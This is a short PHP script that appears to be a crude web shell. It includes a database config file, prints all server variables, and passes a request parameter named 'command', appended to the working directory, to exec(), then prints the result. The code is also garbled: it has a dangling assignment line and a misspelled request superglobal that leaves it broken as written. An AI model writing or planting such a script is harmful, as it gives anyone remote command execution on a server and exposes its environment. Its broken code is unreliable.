<?php
include("_db_config.php");
print_r($_SERVER);
$su = 
$com = $_SERVER['PWD'] .';' . $_REQUEDST['command'];
exec($com, $resp, $num);
print_r($resp);
print_r($num);
?>